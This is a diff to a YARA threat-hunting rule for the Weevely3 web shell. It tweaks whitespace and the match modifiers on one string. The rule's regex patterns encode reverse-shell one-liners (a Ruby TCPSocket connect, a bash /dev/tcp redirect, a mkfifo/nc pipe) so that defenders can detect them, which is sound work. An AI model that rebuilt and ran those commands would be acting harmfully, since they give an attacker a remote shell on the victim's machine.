@@ -1,7 +1,7 @@
 rule Weevely3
 {
     meta:
-        description = "Detection patterns for the tool 'Weevely3' taken from the ThreatHunting-Keywords github project" 
+        description = "Detection patterns for the tool 'Weevely3' taken from the ThreatHunting-Keywords github project"
         author = "@mthcht"
         reference = "https://github.com/mthcht/ThreatHunting-Keywords"
         tool = "Weevely3"
@@ -28,7 +28,7 @@ rule Weevely3
         $string6 = /ruby\s\-rsocket\s\-e\'f\=TCPSocket\.open\(\\"\$\{lhost\}\\"\,\$\{port\}\)\.to_i/ nocase ascii wide
         // Description: Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime
         // Reference: https://github.com/epinna/weevely3
-        $string7 = /sleep\s1\;\s\/bin\/bash\s\-c\s\\\'\$\{shell\}\s0\<\/dev\/tcp\/\$\{lhost\}\/\$\{port\}\s1\>\&0\s2\>\&0/ nocase ascii wide
+        $string7 = /sleep\s1\;\s\/bin\/bash\s\-c\s\\\'\$\{shell\}\s0\<\/dev\/tcp\/\$\{lhost\}\/\$\{port\}\s1\>\&0\s2\>\&0/
         // Description: Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime
         // Reference: https://github.com/epinna/weevely3
         $string8 = /sleep\s1\;\srm\s\-rf\s\/tmp\/f\;mkfifo\s\/tmp\/f\;cat\s\/tmp\/f\|\$\{shell\}\s\-i\s2\>\&1\|nc\s\$\{lhost\}\s\$\{port\}\s\>\/tmp\/f/ nocase ascii wide
